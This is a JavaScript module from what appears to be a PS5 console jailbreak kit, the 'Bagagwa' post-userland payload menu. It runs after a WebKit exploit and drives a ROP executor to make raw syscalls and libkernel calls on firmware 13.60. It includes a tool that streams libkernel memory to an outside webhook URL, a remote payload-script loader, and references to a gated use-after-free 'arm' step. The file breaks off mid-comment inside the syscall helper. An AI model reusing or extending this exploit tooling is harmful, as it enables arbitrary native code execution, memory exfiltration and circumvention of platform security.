/*
 * bagagwa_probe.js -- the post-userland payload menu.
 *
 * This is the screen you get the moment the WebKit half succeeds. It is loaded by
 * p2jb.html IN PLACE OF p2jb.js when the URL carries &sc=1 (the "Syscall test" entry on
 * index.html), i.e. after the page has already done everything a real run needs except
 * the kernel exploit itself:
 *
 *     core.js primitive -> prepare(p) -> libkernel base -> rop-worker.js
 *     -> p2jb_lk.js (per-fw LK RVAs) -> p2jb_poops.js (Y2JB adapter + window.syscall)
 *
 * So window.syscall() here is the SAME synchronous ROP executor p2jb.js uses. The menu
 * measures the firmware rather than simulating it.
 *
 * WHY A MENU AND NOT THE EXPLOIT
 * ------------------------------
 * poops and p2jb are both patched on 13.60, so the only question worth answering there
 * first is whether the kernel still REACHES these calls at all. That is answerable in one
 * run, without corrupting anything, and it should not be entangled with the destructive
 * step. Every payload below is read-only or self-contained; nothing here writes kernel
 * memory and nothing here arms the Bagagwa UAF.
 *
 * The UAF is deliberately NOT a tile -- see the block at the end of this file.
 *
 * REPORTING
 * ---------
 * Each line goes four ways, because on a static host there is no server log and a single
 * channel always loses something: this panel's own output pane, the page's #scr log via
 * window.flushMark, the crash-surviving beacon via window.syncMark, and a notification
 * per verdict. DOWNLOAD LOG writes the whole buffer as a file.
 *
 * ERRNO ENCODING -- READ BEFORE TRUSTING A VERDICT
 * ------------------------------------------------
 * window.syscall() returns the RAW 64-bit rax from syscall_wrapper, and that wrapper is
 * `mov r10,rcx; syscall; ret` (signature 49 89 ca 0f 05 c3, p2jb_lk.js): a bare svc shim
 * with NO -1 conversion. On FreeBSD's raw ABI the errno is left IN rax and failure is
 * signalled by CF -- which `syscall; ret` neither clears nor exports. So a small positive
 * rax is AMBIGUOUS: it can be a real return value or an errno.
 *
 * That ambiguity is not cosmetic. A patched aio_multi_wait returns ENOSYS (78 = 0x4e); a
 * decoder that only understands the -errno shape reads 0x4e as a small positive SUCCESS and
 * prints "aio_multi_wait REACHABLE" on the one firmware where the chain is dead. Two
 * things resolve it and BOTH are used below:
 *
 *   1. T0 (Syscall convention) MEASURES it, from close() on a bad fd -- a native call that
 *      cannot succeed, so whatever rax holds IS the error form -- followed by a getpid
 *      CANARY proving the kernel still answers. (An earlier draft ended with an out-of-range
 *      syscall number to read the ENOSYS encoding directly; on real 13.60 hardware that
 *      call WEDGED the kernel instead of returning ENOSYS, freezing the page for the full
 *      spin cap. T0 now calls only numbers proven to exist, and infers the ENOSYS shape.)
 *      Result is kept in CONV for the whole run.
 *   2. expectFail, passed by the caller for calls whose arguments make success impossible
 *      (aio_multi_wait with num=0). If such a call cannot have succeeded then rax is the
 *      error indication regardless of convention, which is what makes T3 safe even before
 *      T0 has run.
 *
 * FreeBSD errno numbering -- in particular ENOSYS = 78, NOT 38, and not ENOSPC. 78 is the
 * single most important value here: it means the syscall does not exist in this kernel,
 * which is the answer that stops the Bagagwa chain dead.
 */
(function () {
    "use strict";

    if (window.__BWP_LOADED) return;
    window.__BWP_LOADED = true;

    var FW = window.fw_str || (window.p && window.p.fw_str) || "?";

    /* ------------------------------------------------------------ errno */

    var ERRNO = {
        1: "EPERM", 2: "ENOENT", 3: "ESRCH", 4: "EINTR", 5: "EIO", 6: "ENXIO",
        7: "E2BIG", 8: "ENOEXEC", 9: "EBADF", 10: "ECHILD", 11: "EDEADLK",
        12: "ENOMEM", 13: "EACCES", 14: "EFAULT", 16: "EBUSY", 17: "EEXIST",
        20: "ENOTDIR", 21: "EISDIR", 22: "EINVAL", 23: "ENFILE", 24: "EMFILE",
        25: "ENOTTY", 28: "ENOSPC", 30: "EROFS", 35: "EAGAIN", 38: "EINPROGRESS",
        45: "EOPNOTSUPP", 48: "EADDRINUSE", 61: "ECONNREFUSED", 78: "ENOSYS",
    };

    /* Render as the raw unsigned 64-bit word. A negative BigInt stringifies as "0x-4e",
     * which hides the one thing a first run most needs to see: the 0xFFFFFFFF high word
     * that distinguishes an error from a value. */
    function hex(v) {
        try {
            var b = BigInt(v);
            if (b < 0n) b = BigInt.asUintN(64, b);
            return "0x" + b.toString(16);
        } catch (e) { return String(v); }
    }

    /* Which error convention syscall_wrapper uses, as MEASURED by T0. "unknown" until
     * then -- and nothing below may claim to identify an errno NUMBER while it is unknown. */
    var CONV = "unknown";        // "raw" | "converted" | "minus1" | "unknown"
    var ERRNO_MAX = 0x6D;        // high-water mark of FreeBSD errno values

    function decode(ret, expectFail) {
        var r;
        try { r = BigInt(ret); } catch (e) { return { ok: false, errno: -1, enc: "unparsed" }; }
        var lo = Number(BigInt.asIntN(32, r));
        var hi = Number((r >> 32n) & 0xFFFFFFFFn);
        /* Plain -1: pthread-style. The errno lives in a slot we cannot read, so the NUMBER
         * is unrecoverable. Must be tested BEFORE the -errno shape, which would otherwise
         * report this as EPERM (n = -(-1) = 1) -- a confident wrong answer. */
        if (hi === 0xFFFFFFFF && lo === -1)
            return { ok: false, errno: -1, errName: "?", enc: "-1 (errno elsewhere)" };
        if (hi === 0xFFFFFFFF && lo < 0) {
            var n = -lo;
            return { ok: false, errno: n, errName: ERRNO[n] || ("errno" + n), enc: "-errno" };
        }
        if (r >= 0n && r <= BigInt(ERRNO_MAX)) {
            var sv = Number(r);
            /* A call that CANNOT have succeeded: rax is the error indication under either
             * raw convention, so the value is the errno itself. 0 is excluded -- a call that
             * returns 0 has succeeded, not failed with "errno 0". */
            if (expectFail && sv > 0)
                return { ok: false, errno: sv, errName: ERRNO[sv] || ("errno" + sv), enc: "errno-raw" };
            return { ok: true, val: r, enc: "raw" };
        }
        if (r >= 0n && r <= 0xFFFFFFFFn) return { ok: true, val: r, enc: "raw" };
        return { ok: true, val: r, enc: "raw-wide" };
    }

    /* Narration-only helper. decode() stays strict, because a call we have NOT pre-judged
     * may legitimately return 22 as a value (a handle, an fd). But once T0 has shown the raw
     * convention, a small positive return from a call we can see FAILED -- e.g. osem_close on
     * a handle that create never produced -- is an errno, and naming it is the difference
     * between "close=0x3" and "close=0x3 (ESRCH)". */
    function errnoHint(ret) {
        try {
            var b = BigInt(ret);
            if (CONV === "raw" && b > 0n && b <= BigInt(ERRNO_MAX))
                return ERRNO[Number(b)] || ("errno" + b);
        } catch (e) { }
        return null;
    }

    /* ============================================================ the panel */

    var CSS = [
        ".bwp-root{position:fixed;inset:0;z-index:2147483647;background:#0c0c0f;",
        "color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;",
        "padding:16px 18px 14px;box-sizing:border-box;user-select:none;-webkit-user-select:none;}",
        ".bwp-root *{box-sizing:border-box;}",
        ".bwp-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}",
        ".bwp-logo{font-size:1.35rem;font-weight:800;letter-spacing:.22em;color:#fff;margin-right:2px;}",
        ".bwp-chip{font-size:.78rem;font-weight:700;letter-spacing:.1em;padding:5px 11px;",
        "border-radius:999px;background:#202125;color:#a2a2a6;}",
        ".bwp-chip.ok{background:#14361f;color:#5fdc90;}",
        ".bwp-chip.bad{background:#3a1717;color:#ff8080;}",
        ".bwp-chip.run{background:#33290d;color:#ffce5c;}",
        ".bwp-spacer{flex:1;}",
        ".bwp-sub{color:#6f7076;font-size:.82rem;line-height:1.5;margin:9px 0 13px;max-width:76rem;}",
        ".bwp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(15.5rem,1fr));",
        "gap:11px;margin-bottom:15px;}",
        ".bwp-tile{background:#202125;border:none;border-radius:1.05rem;padding:13px 15px;",
        "text-align:left;color:#fff;cursor:pointer;font-family:inherit;",
        "transition:background-color .18s ease;display:flex;flex-direction:column;gap:5px;}",
        ".bwp-tile:hover:not(.busy){background:#a2a2a6;color:#202020;}",
        ".bwp-tile:hover:not(.busy) .bwp-desc{color:#3a3a3a;}",
        ".bwp-tile:focus{outline:2px solid #5fdc90;outline-offset:2px;}",
        ".bwp-tile.busy{opacity:.72;cursor:default;}",
        ".bwp-tile.ok{background:#14361f;}",
        ".bwp-tile.bad{background:#3a1717;}",
        ".bwp-name{font-size:1.02rem;font-weight:800;letter-spacing:.02em;}",
        ".bwp-desc{font-size:.76rem;color:#9a9aa2;line-height:1.4;}",
        ".bwp-state{font-size:.7rem;font-weight:700;letter-spacing:.12em;color:#6f7076;",
        "text-transform:uppercase;}",
        ".bwp-tile.ok .bwp-state{color:#5fdc90;}",
        ".bwp-tile.bad .bwp-state{color:#ff8080;}",
        ".bwp-tile.busy .bwp-state{color:#ffce5c;}",
        ".bwp-outhd{display:flex;align-items:center;gap:9px;color:#6f7076;",
        "font-size:.74rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;",
        "margin-bottom:7px;}",
        ".bwp-out{flex:1;min-height:8rem;overflow:auto;background:#16161a;",
        "border:1px solid #26262b;border-radius:.7rem;margin:0;padding:11px 13px;",
        "font:15px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
        "white-space:pre-wrap;word-break:break-word;-webkit-user-select:text;user-select:text;}",
        /* Fullscreen output: the operator asked for a BIG readable log on a TV across the
         * room. Position:fixed over everything; the exit button stays reachable (it is
         * re-parented visually by z-index and the same toggle). */
        ".bwp-out.fs{position:fixed;inset:0;z-index:2147483647;border-radius:0;border:none;",
        "min-height:0;font:19px/1.5 ui-monospace,Menlo,Consolas,monospace;}",
        ".bwp-sec{color:#fff;font-weight:800;}",
        ".bwp-ok{color:#5fdc90;}",
        ".bwp-err{color:#ff8080;}",
        ".bwp-warn{color:#ffce5c;}",
        ".bwp-dim{color:#6f7076;}",
        ".bwp-foot{display:flex;gap:11px;flex-wrap:wrap;margin-top:13px;}",
        ".bwp-btnpv{background:#14361f;color:#5fdc90;}",
        ".bwp-btnpv:hover{background:#1d5230;color:#fff;}",
        ".bwp-pvlab{align-self:center;color:#5fdc90;font:800 .8rem Arial;letter-spacing:.14em;}",
        ".bwp-btn{padding:.68rem 1.3rem;border-radius:1.05rem;border:none;cursor:pointer;",
        "background:#202125;color:#fff;font:800 .92rem Arial;transition:background-color .18s ease;}",
        ".bwp-btn:hover{background:#a2a2a6;color:#202020;}",
        ".bwp-btn:focus{outline:2px solid #5fdc90;outline-offset:2px;}",
        ".bwp-mini{position:fixed;bottom:14px;right:14px;z-index:2147483647;",
        "padding:.7rem 1.5rem;border-radius:1.15rem;border:none;cursor:pointer;",
        "background:#202125;color:#fff;font:800 1rem Arial;display:none;}",
        ".bwp-mini:hover{background:#a2a2a6;color:#202020;}",
    ].join("");

    /* ==================================== THEME: "BOO & FANTASY" (override layer)
     *
     * Appended as a SECOND sheet so it wins on equal specificity without touching
     * one base rule. That is deliberate: the base sheet carries the layout the
     * tiles, the grid and the harnesses' DOM assumptions depend on, and a theme
     * edit should never be able to break a test. Only colour, typeface, glow and
     * the fullscreen font size live here.
     *
     * COST: one <style> node and a few hundred bytes of CSS. No images, no extra
     * listeners, no DOM nodes -- so it cannot add measurable memory on the console,
     * which was the constraint. */
    var THEME = [
        /* the void behind everything: a violet-to-black candlelit vignette */
        ".bwp-root{background:radial-gradient(125% 95% at 50% -12%,#241a4d 0%,#130d28 46%,#070411 100%);",
        "color:#e9e4ff;font-family:Georgia,'Times New Roman',serif;}",
        ".bwp-logo{color:#ffd479;letter-spacing:.3em;",
        "text-shadow:0 0 16px rgba(160,108,255,.8),0 0 40px rgba(124,240,192,.28);}",
        ".bwp-chip{background:#241a4d;color:#b9aee6;border:1px solid #3b2d70;letter-spacing:.12em;}",
        ".bwp-chip.ok{background:#123a30;color:#7cf0c0;border-color:#1e6b57;}",
        ".bwp-chip.bad{background:#3d1226;color:#ff8fae;border-color:#7a2340;}",
        ".bwp-chip.run{background:#3a2c0d;color:#ffd479;border-color:#6d5316;}",
        ".bwp-sub{color:#8d82bb;}",
        ".bwp-tile{background:linear-gradient(160deg,#241a4d,#191136);border:1px solid #372963;color:#e9e4ff;}",
        ".bwp-tile:hover:not(.busy){background:#a06cff;color:#120c26;",
        "box-shadow:0 0 24px rgba(160,108,255,.55);}",
        ".bwp-tile:hover:not(.busy) .bwp-desc{color:#2a1f52;}",
        ".bwp-tile:focus{outline:2px solid #7cf0c0;}",
        ".bwp-tile.busy{box-shadow:0 0 20px rgba(255,212,121,.4);}",
        ".bwp-tile.ok{background:#123a30;border-color:#1e6b57;}",
        ".bwp-tile.bad{background:#3d1226;border-color:#7a2340;}",
        ".bwp-desc{color:#a99ed6;}",
        ".bwp-state{color:#8d82bb;}",
        ".bwp-tile.ok .bwp-state{color:#7cf0c0;}",
        ".bwp-tile.bad .bwp-state{color:#ff8fae;}",
        ".bwp-tile.busy .bwp-state{color:#ffd479;}",
        ".bwp-outhd{color:#8d82bb;}",
        ".bwp-out{background:#0d0920;border:1px solid #372963;color:#cfc7f0;",
        "font:14px/1.55 ui-monospace,Menlo,Consolas,monospace;}",
        /* FULLSCREEN, two fixes the operator asked for:
         *  1. font SMALL (was 19px) -- fullscreen is for reading a LOT of log;
         *  2. z-index 7, below the footer/floating exit, so the exit control is
         *     actually CLICKABLE. The old 2147483647 covered its own undo button,
         *     which is why fullscreen could not be left. */
        ".bwp-out.fs{font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#070411;z-index:7;}",
        ".bwp-foot{position:relative;z-index:9;}",
        ".bwp-head{position:relative;z-index:9;}",
        ".bwp-outhd{position:relative;z-index:9;}",
        ".bwp-fsx{position:fixed;top:12px;right:14px;z-index:2147483647;display:none;",
        "padding:.55rem 1.1rem;border-radius:1rem;border:1px solid #7a2340;cursor:pointer;",
        "background:#3d1226;color:#ff8fae;font:800 .9rem Georgia,serif;}",
        ".bwp-fsx:hover{background:#ff8fae;color:#120c26;}",
        ".bwp-sec{color:#ffd479;font-weight:800;letter-spacing:.03em;}",
        ".bwp-ok{color:#7cf0c0;}",
        ".bwp-err{color:#ff8fae;}",
        ".bwp-warn{color:#ffd479;}",
        ".bwp-dim{color:#8d82bb;}",
        ".bwp-foot{gap:9px;align-items:center;}",
        ".bwp-btn{background:#241a4d;color:#e9e4ff;border:1px solid #372963;",
        "font:700 .9rem Georgia,serif;}",
        ".bwp-btn:hover{background:#a06cff;color:#120c26;}",
        ".bwp-btn:focus{outline:2px solid #7cf0c0;}",
        ".bwp-btnpv{background:#123a30;color:#7cf0c0;border:1px solid #1e6b57;}",
        ".bwp-btnpv:hover{background:#1e6b57;color:#fff;}",
        ".bwp-pvlab{color:#7cf0c0;font:800 .74rem Arial;}",
        ".bwp-mini{background:#241a4d;color:#ffd479;border:1px solid #372963;font:800 1rem Georgia,serif;}",
        ".bwp-mini:hover{background:#a06cff;color:#120c26;}",
        /* tools rows: kept out of the way until asked for (see the tools toggle) */
        ".bwp-tools{display:none;flex-direction:column;gap:0;}",
        ".bwp-tools.on{display:flex;}",
        ".bwp-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:8px;}",
        ".bwp-in{flex:0 1 30rem;min-width:11rem;padding:.5rem .75rem;border-radius:.65rem;",
        "border:1px solid #372963;background:#0d0920;color:#e9e4ff;",
        "font:12.5px ui-monospace,Menlo,Consolas,monospace;}",
        ".bwp-in:focus{outline:2px solid #7cf0c0;outline-offset:1px;}",
        ".bwp-lab{color:#8d82bb;font:700 .72rem Arial;letter-spacing:.12em;text-transform:uppercase;}",
        ".bwp-lnk{color:#7cf0c0;font:700 .78rem Arial;text-decoration:none;border-bottom:1px dotted #1e6b57;}",
        ".bwp-note{color:#8d82bb;font-size:.75rem;line-height:1.45;margin-top:8px;max-width:78rem;}",
    ].join("");

    var styleEl = document.createElement("style");
    styleEl.textContent = CSS;
    document.head.appendChild(styleEl);
    /* themeEl is appended AFTER the base sheet on purpose: equal specificity means
     * last-wins, so the theme needs no !important and the base layout sheet stays
     * the single source of geometry. */
    var themeEl = document.createElement("style");
    themeEl.textContent = THEME;
    document.head.appendChild(themeEl);

    var root = document.createElement("div");
    root.className = "bwp-root";
    root.innerHTML = [
        '<div class="bwp-head">',
        '  <span class="bwp-logo">BAGAGWA</span>',
        '  <span class="bwp-chip" id="bwp-fw"></span>',
        '  <span class="bwp-chip" id="bwp-ul">USERLAND</span>',
        '  <span class="bwp-chip" id="bwp-verdict"></span>',
        '  <span class="bwp-spacer"></span>',
        '  <button class="bwp-btn" id="bwp-hide">hide</button>',
        '</div>',
        '<div class="bwp-sub" id="bwp-sub"></div>',
        '<div class="bwp-grid" id="bwp-grid"></div>',
        '<div class="bwp-outhd"><span>output</span><span id="bwp-count"></span></div>',
        '<pre class="bwp-out" id="bwp-out"></pre>',
        /* TOOLS DRAWER. The panel is meant to read simply: one grid, one log, one
         * run button. The dumper and the remote loader need a URL box each, so they
         * live behind this toggle and cost nothing until opened. */
        '<div class="bwp-tools" id="bwp-tools">',
        '  <div class="bwp-row">',
        '    <span class="bwp-lab">dump libkernel \u2192</span>',
        '    <input class="bwp-in" id="bwp-durl" placeholder="https://webhook.site/&lt;your-uuid&gt;  \u2014 POST target (anything that logs a request body)">',
        '    <span class="bwp-lab">bytes</span><input class="bwp-in" id="bwp-dlen" style="max-width:7rem;" value="0x4000">',
        '    <span class="bwp-lab">chunk</span><input class="bwp-in" id="bwp-dchunk" style="max-width:6rem;" value="0x800">',
        '    <span class="bwp-lab">base</span><input class="bwp-in" id="bwp-dbase" style="max-width:7rem;" value="lk">',
        '    <button class="bwp-btn" id="bwp-dstart">stream dump</button>',
        '    <button class="bwp-btn" id="bwp-dstop">stop</button>',
        '  </div>',
        '  <div class="bwp-row">',
        '    <span class="bwp-lab">load js \u2192</span>',
        '    <input class="bwp-in" id="bwp-jurl" placeholder="https://\u2026/payload.js  \u2014 script URL (Y2JB remotejsloader / websrv style host)">',
        '    <button class="bwp-btn" id="bwp-jload">load script</button>',
        '  </div>',
        '  <div class="bwp-note" id="bwp-note"></div>',
        '</div>',
        '<div class="bwp-foot">',
        '  <button class="bwp-btn" id="bwp-all">run all</button>',
        '  <span class="bwp-pvlab">PROVEN\u00a0\u2014\u00a0one\u00a0tap\u00a0=\u00a0proof:</span>',
        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-notify">notify</button>',
        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-pid">pid</button>',
        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-fd">fd</button>',
        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-osem">osem</button>',
        '  <button class="bwp-btn bwp-btnpv" id="bwp-pv-aio">AIO</button>',
        '  <button class="bwp-btn" id="bwp-toolsbtn">tools</button>',
        '  <button class="bwp-btn" id="bwp-fs">fullscreen</button>',
        '  <button class="bwp-btn" id="bwp-clear">clear</button>',
        '  <button class="bwp-btn" id="bwp-dl">download log</button>',
        '  <button class="bwp-btn" id="bwp-clearsaved" style="display:none;">clear saved</button>',
        '</div>',
    ].join("");
    document.body.appendChild(root);

    var mini = document.createElement("button");
    mini.className = "bwp-mini";
    mini.textContent = "show bagagwa panel";
    document.body.appendChild(mini);

    /* The fullscreen UNDO. The old layout put the log at z-index 2147483647 and so
     * covered its own exit button: fullscreen was a one-way trip. This floating
     * button is a direct child of <body> at the same max z-index as the log, shown
     * only while fullscreen is on -- always on top, always clickable. Esc also
     * exits. */
    var fsx = document.createElement("button");
    fsx.className = "bwp-fsx";
    fsx.textContent = "\u2715 exit fullscreen";
    document.body.appendChild(fsx);

    var elGrid = document.getElementById("bwp-grid");
    var elOut = document.getElementById("bwp-out");
    var elSub = document.getElementById("bwp-sub");
    var elFw = document.getElementById("bwp-fw");
    var elUl = document.getElementById("bwp-ul");
    var elVerdict = document.getElementById("bwp-verdict");
    var elCount = document.getElementById("bwp-count");

    elFw.textContent = "fw " + FW;
    elSub.textContent = "Userland is up: the WebKit primitive, the libkernel base derivation "
        + "and the worker ROP executor all completed. Every payload below runs through that "
        + "same executor, and none of them writes kernel memory.";

    function chip(el, cls, text) {
        el.className = "bwp-chip" + (cls ? " " + cls : "");
        el.textContent = text;
    }

    /* ------------------------------------------------------------ logging */

    var LOG = [];
    var MAXDOM = 1200;

    /* Crash-persisted log. On a static host there is no server log, and the single most
     * common failure on a console is the WebProcess dying mid-run -- at which point an
     * in-memory log dies with the page. Every line therefore ALSO lands in localStorage
     * (kept tail-truncated), and on the next load anything saved is restored behind a
     * clear-saved-log button, so the last lines before a crash are readable off-console.
     * The download log button reads this same store, so a log survives even a crash that
     * happened on a previous page load. Ported from OzRviju/bagagwa-exploit's bgw_log. */
    var LOGKEY = "bwslop_sc_log";
    var persisted = null;
    try { persisted = localStorage.getItem(LOGKEY); } catch (e) { }

    function persistAppend(line) {
        try {
            var cur = localStorage.getItem(LOGKEY) || "";
            cur += line + "\n";
            /* TAIL BUDGET, raised from 16k/8k. The detailed per-tile rows and the
             * offsets/peek byte lines roughly doubled what a full RUN ALL writes, and at
             * the old budget the EARLY rows were being evicted before the run ended -- so
             * the crash-recovery log lost exactly the part a post-mortem needs (the
             * offset rows printed before ARM). 64k/32k keeps a whole run, and the cost is
             * one string append per line, not a rewrite of history. */
            if (cur.length > 64000) cur = cur.slice(-32000);
            localStorage.setItem(LOGKEY, cur);
        } catch (e) { }
    }

    function stamp() {
        var d = new Date();
        var p = function (n, w) { return String(n).padStart(w || 2, "0"); };
        return p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
    }

    function paint(text, cls) {
        var line = "[" + stamp() + "] " + text;
        LOG.push(line);
        persistAppend(line);
        var span = document.createElement("span");
        if (cls) span.className = "bwp-" + cls;
        span.textContent = line + "\n";
        elOut.appendChild(span);
        while (elOut.childNodes.length > MAXDOM) elOut.removeChild(elOut.firstChild);
        elOut.scrollTop = elOut.scrollHeight;
        elCount.textContent = LOG.length + " lines";
    }

    function persistClear() {
        try { localStorage.removeItem(LOGKEY); } catch (e) { }
        var b = document.getElementById("bwp-clearsaved");
        if (b) b.style.display = "none";
        paint("saved log cleared", "dim");
    }

    /* Everything a payload logs goes to this panel AND to the page's own log AND to the
     * beacon, so a WebProcess crash still leaves the last line readable off-console. */
    function out(tag, detail, cls) {
        paint("sc " + tag + (detail ? "  " + detail : ""), cls);
        try { if (window.flushMark) window.flushMark("SC-" + tag, String(detail || "")); } catch (e) { }
        try { if (window.syncMark) window.syncMark("SC-" + tag, String(detail || "")); } catch (e) { }
    }
    /* ============================================== NATIVE PS5 NOTIFICATION
     *
     * THE 15:37 LESSON: the old notify() called window.send_notification, which is only
     * ever defined by p2jb_poops.js -- a module this page never loads. Every "NOTIFY" row
     * in every log before this fix was a SILENT NO-OP. This is the real thing.
     *
     * Recipe ported from Theo3535/slopkit's notify.html (the implementation the operator
     * pointed at as working on hardware, 13.60 profile nt=0x48b0 -- the same RVA our own
     * offsets/13.60.js carries as OFFSET_lk_sceKernelSendNotificationRequest):
     *   - the notification request is a ZEROED 0xC30 buffer with the ASCII message at
     *     +0x2D (their NOTIFICATION_REQUEST_SIZE / NOTIFICATION_MESSAGE_OFFSET, proven on
     *     hardware); every other field zero is exactly what their layout leaves behind;
     *   - delivery is syscall 0x2CA -- SYS_NOTIFY_APP_EVENT, documented in our own
     *     syscalls.js -- with the buffer pointer as its first argument;
     *   - ret 0 == the toast was queued. Anything else is an errno and is REPORTED.
     *
     * SAFETY: a normal syscall from the proven executor, one pointer to a buffer WE
     * allocated. No kernel write, no free, no node, no reclaim. 0x2CA is an in-range,
     * documented number (the wedge lesson was about OUT-OF-RANGE numbers like 0x7FF).
     *
     * ?notify=0 (Wamphyre/PSAITO's kill-switch design) suppresses every toast: if a
     * notification ever wedges the browser, the panel still runs with it disabled. */
    var NOTIFY_OFF = false;
    try { NOTIFY_OFF = /(^|[?&])notify=0(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }
    /* TWO ROUTES, MEASURED AGAINST EACH OTHER.
     *
     * slopkit's toast that the operator pointed at as working on 13.60 does NOT use a
     * syscall: it calls the libkernel FUNCTION sceKernelSendNotificationRequest at
     * libkernelBase + 0x48B0, with GoldHEN's own shape
     *     sceKernelSendNotificationRequest(0, req, sizeof(req), 0)
     * over a struct { char unused[0x2D]; char message[]; } of 0xC30 bytes -- which is why
     * the message sits at +0x2D and the total is 0xC30. That is a DIFFERENT entry from
     * syscall 0x2CA (SYS_NOTIFY_APP_EVENT, documented in our own syscalls.js).
     *
     * So we try the PROVEN function route first (via the executor's window.call, the same
     * ROP chain shape as window.syscall), then the syscall as a fallback, and whichever
     * returns 0 sticks for the session. The log names the winning route, so "notify works"
     * is a measurement with a provenance, not an assertion. */
    var NOTIFY_RVA = 0x48B0n;       /* libkernel sceKernelSendNotificationRequest (13.60) */
    var NOTIFY_NR = 0x2CA;          /* SYS_NOTIFY_APP_EVENT -- fallback route */
    var NOTIFY_MSG_OFF = 0x2D;
    var NOTIFY_REQ_SIZE = 0xC30;
    var notifyRoute = 0;            /* 0 undecided, 1 = libkernel call, 2 = syscall */
    var notifyOK = false;           /* at least one toast DELIVERED (ret 0) this session */

    function notifyKbase() {
        try {
            var st = window.rop_worker && window.rop_worker.state;
            if (st && st.kbase) return B(st.kbase);
        } catch (e) { }
        return 0n;
    }
    /* Any return other than 0 means the kernel refused; the FIRST route that answers 0
     * wins and is remembered, so later toasts cost one call, not a ladder. */
    function notifySend(msg) {
        if (NOTIFY_OFF) return { off: true };
        var text = String(msg).slice(0, NOTIFY_REQ_SIZE - NOTIFY_MSG_OFF - 1);
        var buf = zeros(malloc(NOTIFY_REQ_SIZE), NOTIFY_REQ_SIZE);
        var bytes = new Uint8Array(text.length + 1);
        for (var i = 0; i < text.length; i++) bytes[i] = text.charCodeAt(i) & 0x7F;
        /* malloc() returns a BigInt: a Number offset here throws "Invalid mix of BigInt
         * and other type in addition" -- exactly why EVERY toast in the 17:26 run failed
         * before any call was made. The offset must be BigInt. */
        window.write_buffer(buf + BigInt(NOTIFY_MSG_OFF), bytes);
        var size = BigInt(NOTIFY_REQ_SIZE);

        /* Route 1: the slopkit/GoldHEN-proven libkernel function. */
        if (notifyRoute !== 2 && typeof window.call === "function") {
            var kbase = notifyKbase();
            if (kbase !== 0n) {
                var r1;
                try {
                    r1 = window.call(kbase + NOTIFY_RVA, 0n, buf, size, 0n);
                } catch (e) { r1 = undefined; }
                if (r1 !== undefined && B(r1) === 0n) {
                    notifyRoute = 1; notifyOK = true;
                    return { ok: true, route: 1, ret: r1 };
                }
                var last1 = (r1 === undefined) ? "call threw" : hex(B(r1));
            } else {
                var last1 = "no kbase yet";
            }
        }

        /* Route 2: the documented syscall. Two shapes, cheapest first. */
        var shapes = [[buf], [0n, buf, size, 0n]];
        var lastErr = last1 || "-";
        for (var si = 0; si < shapes.length; si++) {
            if (notifyRoute === 1) break;
            var rs = S("notify(0x2CA shape" + (si + 1) + ")", NOTIFY_NR, shapes[si], true, true);
            if (rs.ret !== undefined && B(rs.ret) === 0n) {
                notifyRoute = 2; notifyOK = true;
                return { ok: true, route: 2, ret: rs.ret };
            }
            lastErr = rs.threw || rs.errName || hex(rs.ret === undefined ? 0n : rs.ret);
        }
        return { ok: false, detail: lastErr };
    }

    function notify(msg) {
        /* Native toast. Every FAILURE is logged with the kernel's own answer. On the first
         * success the log names WHICH route delivered (libkernel call vs syscall), so the
         * operator can read the provenance off the panel. */
        var before = notifyRoute;
        var res;
        try { res = notifySend(msg); } catch (e) { res = { threw: String((e && e.message) || e).slice(0, 80) }; }
        if (res && res.ok) {
            if (before === 0) out("NOTIFY", "DELIVERED via route " + res.route
                + (res.route === 1 ? " (libkernel call sceKernelSendNotificationRequest, GoldHEN shape)"
                    : " (syscall 0x2CA)") + " -- ret 0", "ok");
            return true;
        }
        if (res && res.off) return false;
        out("NOTIFY", "FAILED " + (res.threw ? "threw " + res.threw : (res.detail || "unknown")), "err");
        return false;
    }

    /* Rich PS5 notifications carrying REAL RESULTS. The kernel notification toast truncates
     * around 70-80 characters, so the result goes FIRST -- "osem REAL HANDLE 0xa6" beats a
     * "bagagwa:" prefix as the visible text. The full detail always goes to the panel log
     * through out(); this is the headline the operator sees on the PS5 UI without opening
     * the browser. Per-tile verdicts call nres with their measured outcome. */
    function nres(res, title) {
        var m = (title || "bagagwa") + ": " + String(res).slice(0, 60);
        notify(m);
        out("NOTIFY", m, "dim");
        return m;
    }

    /* THE ONE DELIBERATE DEPARTURE from read-only in this file: the UAF arm. It is gated on
     * the ?arm=1 URL switch -- which index.html only appends when the operator's checkbox
     * is ticked, and which p2jb.html forwards to this script -- so arming can never happen
     * from a button click alone, and the armed tile does not even render without the
     * switch. The checkbox is checked fresh on every load; it is never persisted. */
    var ARMED_OK = false;
    try { ARMED_OK = /(^|[?&])arm=1(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }

    /* --------------------------------------------------- call one syscall */

    /* Never throws: a throw is a RESULT here. The most likely first outcome on a new
     * firmware is resolveSlot() failing to find the parked worker, and the operator has to
     * be able to read that rather than watch the tab die silently. */
    function S(label, nr, args, expectFail, quiet) {
        /* A wedge during ANY earlier payload latches W.dead=true in the executor. The
         * error thrown at the end of that spin was already beacons as RW-WEDGE with a
         * shape diagnosis, but the NEXT call would otherwise burn ANOTHER full spin cap
         * (~135s) before failing the same way -- the exact pathology rop-worker's wedge
         * block documents. Refuse instead: say it is dead and point at the beacons. */
        try {
            var st0 = (window.rop_worker && window.rop_worker.state) || null;
            if (st0 && st0.dead) {
                out(label, "SKIPPED -- executor latched dead (RW-WEDGE beacons have the "
                    + "shape diagnosis); reload the page, do NOT keep calling", "err");
                return { label: label, nr: nr, threw: "executor dead", ok: false };
            }
        } catch (e) { }
        var a = (args || []).slice(0, 6);
        /* Zero-fill EVERY argument register; do NOT leave them undefined. The chain pops a
         * register only when it is defined, so an undefined argument keeps whatever the
         * PREVIOUS chain left there -- and a stale register read as a pointer is exactly how
         * a probe manufactures a fake EFAULT. The first 13.60 run printed osem_open=0xe
         * (EFAULT) on a one-argument call for precisely this reason: its second register
